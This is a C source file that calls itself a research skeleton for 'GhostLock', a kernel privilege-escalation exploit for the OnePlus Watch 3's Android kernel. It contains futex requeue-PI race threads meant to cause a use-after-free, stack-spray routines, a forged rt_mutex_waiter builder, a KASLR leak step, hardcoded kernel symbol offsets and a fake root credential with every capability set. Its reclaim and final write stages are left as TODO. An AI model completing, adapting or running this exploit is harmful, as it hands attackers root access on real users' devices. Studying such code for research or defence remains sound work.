/* ghostlock_w3.c — GhostLock (CVE-2026-43499) research skeleton for
 * OnePlus Watch 3 (Snapdragon W5+, GKI 5.15.170-android14-11).
 *
 * STATUS: RESEARCH SKELETON — this is NOT a finished, stable exploit.
 * PI trigger + syscall-s are complete; stack reclaim, leak and final stage are
 * marked TODO and require tuning on the device (see DESIGN_*.md).
 *
 * Build:
 *   CC=$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang
 *   $CC -O2 -static -pie -fPIE -o ghostlock64 ghostlock_w3.c -lpthread
 *
 * FOR RESEARCH ON YOUR OWN DEVICE ONLY.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include "offsets_w3.h"
#include "kaaslr.h"

/* ------------------------------------------------------------------ */
/* 1. AArch64 raw syscalls + futex ABI                                 */
/* ------------------------------------------------------------------ */
#define SYS_FUTEX        98
#define SYS_SCHED_SETATTR 274
#define SYS_PRCTL        167
#define SYS_GETUID       174

#define FUTEX_WAIT             0
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_WAIT_REQUEUE_PI  11
#define FUTEX_CMP_REQUEUE_PI   12
#define FUTEX_PRIVATE_FLAG     128

static inline long sys_futex(void *u, int op, int val, void *t, void *u2, int v3)
{
    register long x8 __asm__("x8") = SYS_FUTEX;
    register long x0 __asm__("x0") = (long)u;
    register long x1 __asm__("x1") = op;
    register long x2 __asm__("x2") = val;
    register long x3 __asm__("x3") = (long)t;
    register long x4 __asm__("x4") = (long)u2;
    register long x5 __asm__("x5") = v3;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory", "cc");
    return x0;
}

struct gh_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static inline long sys_sched_setattr(int pid, struct gh_sched_attr *a, unsigned f)
{
    register long x8 __asm__("x8") = SYS_SCHED_SETATTR;
    register long x0 __asm__("x0") = pid;
    register long x1 __asm__("x1") = (long)a;
    register long x2 __asm__("x2") = f;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x8)
                     : "memory", "cc");
    return x0;
}

/* ------------------------------------------------------------------ */
/* 2. Global trigger state                                             */
/* ------------------------------------------------------------------ */
static volatile int f1, f2, f3;          /* futex PI words           */
static pthread_barrier_t bar;

static void pin_cpu(int cpu)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);
}

/* Thread whose rt_mutex_waiter is to be UAF-ed. */
static void *waiter_thread(void *arg)
{
    pin_cpu(1);
    pthread_barrier_wait(&bar);
    /* Waits on f1; on requeue-PI its waiter lands on the stack. */
    long r = sys_futex((void *)&f1,
                       FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                       0, (void *)&f2, NULL, 0);
    (void)r;   /* <- returns after EDEADLK, pi_blocked_on stays dangling */
    return NULL;
}

/* Owner of f2 — closes the PI cycle (choreography to be tuned). */
static void *owner_thread(void *arg)
{
    pin_cpu(2);
    pthread_barrier_wait(&bar);
    sys_futex((void *)&f2, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    /* TODO: PI-wait so that a cycle waiter->f2owner->... forms; see §4.1 */
    for (;;) pause();
    return NULL;
}

/* Requeuer — invokes proxy rollback from remove_waiter(). */
static void *requeuer_thread(void *arg)
{
    pin_cpu(3);
    pthread_barrier_wait(&bar);
    for (;;) {
        /* val == *f2 — required for requeue-PI to take the proxy path. */
        long r = sys_futex((void *)&f2,
                           FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                           1, (void *)&f3, (void *)(long)f2, 0);
        if (r == -EDEADLK) break;          /* UAF achieved */
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* 3. Reclaim the freed stack frame (TODO: tune offset)                */
/* ------------------------------------------------------------------ */

/* 3a. writev with 8 iovec: iovstack[8] lands on the stack and fills it. */
static void spray_writev(const void *buf, size_t len)
{
    struct iovec iov[8];
    for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)buf; iov[i].iov_len = len; }
    /* -1 => EBADF, but iovstack is already copied onto the stack */
    writev(-1, iov, 8);
}

/* 3b. pselect6: copies a controlled fd_set onto the stack (arm64 port path). */
static void spray_pselect(const void *buf)
{
    syscall(SYS_pselect6, 1, buf, NULL, NULL, NULL, NULL);
}

/* 3c. prctl(PR_SET_NAME): 15 controlled bytes on the stack. */
static void spray_prctl_name(const void *buf)
{
    syscall(SYS_PRCTL, 15 /*PR_SET_NAME*/, buf, 0, 0, 0);
}

/* Builds a forged rt_mutex_waiter in the buffer per W3 offsets. */
static void build_fake_waiter(void *page, uint64_t fake_task,
                              uint64_t fake_lock, int prio)
{
    uint8_t *w = page;
    memset(w, 0, SZ_RT_MUTEX_WAITER);
    /* tree_entry / pi_tree_entry: set collectively by rb_* at runtime */
    *(uint64_t *)(w + OFF_W_TASK) = fake_task;    /* task_struct*  */
    *(uint64_t *)(w + OFF_W_LOCK) = fake_lock;    /* rt_mutex_base* */
    *(uint32_t *)(w + OFF_W_WAKE_STATE) = 0;
    *(uint32_t *)(w + OFF_W_PRIO) = (uint32_t)prio;
}

/* ------------------------------------------------------------------ */
/* 4. KASLR + physmap leak (TODO — prefetch side-channel)              */
/* ------------------------------------------------------------------ */
static uint64_t ktext = 0;      /* runtime _text (from perf leak) */
static uint64_t kslide = 0;

static int leak_kaslr(void)
{
    ktext = kaaslr_text_base();
    if (!ktext) return -1;
    kslide = ktext - KIMAGE_NOMINAL;
    return 0;
}

/* ------------------------------------------------------------------ */
/* 5. Data-only finale (TODO — choose A or B)                          */
/* ------------------------------------------------------------------ */
struct fake_cred {                       /* layout = struct cred (0xB0) */
    uint8_t  raw[SZ_CRED];
};
static struct fake_cred g_fake_cred __attribute__((aligned(16)));

static void build_fake_cred(uint64_t user_ns)
{
    memset(&g_fake_cred, 0, sizeof(g_fake_cred));
    uint8_t *c = g_fake_cred.raw;
    *(uint32_t *)(c + OFF_C_USAGE) = 0x100;          /* usage */
    /* uid..fsgid = 0 (already 0) */
    *(uint64_t *)(c + OFF_C_CAP_PERMITTED) = ~0UL;   /* full CAP */
    *(uint64_t *)(c + OFF_C_CAP_EFFECTIVE) = ~0UL;
    *(uint64_t *)(c + OFF_C_CAP_BSET)      = ~0UL;
    *(uint64_t *)(c + OFF_C_CAP_AMBIENT)   = ~0UL;
    /* security=a NULL (no LSM context / or &selinux_state to be tuned) */
    *(uint64_t *)(c + OFF_C_USER_NS) = user_ns;      /* &init_user_ns */
}

/* Target A: write_value(fake_cred_addr, current + OFF_T_CRED) */
static int final_stage_A(uint64_t current_task, uint64_t fake_cred_addr)
{
    /* TODO: use the write primitive (rb_insert/rb_erase) to write
     * fake_cred_addr at current_task + OFF_T_CRED. */
    return -1;
}

/* ------------------------------------------------------------------ */
/* 6. main                                                             */
/* ------------------------------------------------------------------ */
int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] GhostLock W3 — research skeleton\n");
    printf("[*] target: 5.15.185-android14-11 (OnePlus Watch 3, OPWWE251)\n");

    if (leak_kaslr() != 0) {
        printf("[!] KASLR leak FAILED (perf unavailable?) — stop.\n");
        return 1;
    }
    printf("[+] _text   = %#018lx  (slide = %#lx)\n",
           (unsigned long)ktext, (unsigned long)kslide);
    printf("    commit_creds      = %#018lx\n", (unsigned long)(ktext + 0x19dd38UL));
    printf("    prepare_kernel_cred = %#018lx\n", (unsigned long)(ktext + 0x19d1c8UL));
    printf("    init_cred         = %#018lx\n", (unsigned long)(ktext + 0x278e5b8UL));
    printf("    init_user_ns      = %#018lx\n", (unsigned long)(ktext + 0x2843e10UL));
    printf("    init_task         = %#018lx\n", (unsigned long)(ktext + 0x27cc280UL));
    printf("    remove_waiter     = %#018lx\n", (unsigned long)(ktext + 0x152bda8UL));

    if (!getenv("GL_TRIGGER")) {
        printf("[*] ETAP 0 (leak) OK. Trigger nieodpalony.\n");
        printf("[*] To fire the trigger: GL_TRIGGER=1 (RISK: kernel panic!).\n");
        return 0;
    }

    f1 = f2 = f3 = 0;
    pthread_barrier_init(&bar, NULL, 3);

    pthread_t tw, to, tr;
    pthread_create(&tw, NULL, waiter_thread,   NULL);
    pthread_create(&to, NULL, owner_thread,    NULL);
    pthread_create(&tr, NULL, requeuer_thread, NULL);

    /* TODO: sequence (see DESIGN_ghostlock_w3.md §4):
     *   1) wait for EDEADLK (proxy rollback -> UAF pi_blocked_on)
     *   2) spray_writev/pselect(build_fake_waiter(...))
     *   3) sched_setattr -> PI chain walk over the UAF (write primitive)
     *   4) final_stage_A(...)  (cred ptr -> forged cred)
     * NOTE: stages 1-3 may cause a kernel panic. Validate by reading
     * linux_banner at ktext+offset before any write.
     */
    printf("[!] trigger and final are TODO — see DESIGN_ghostlock_w3.md §4\n");

    pthread_join(tr, NULL);
    printf("[*] uid=%ld (0 == root)\n", syscall(SYS_GETUID));
    return 0;
}
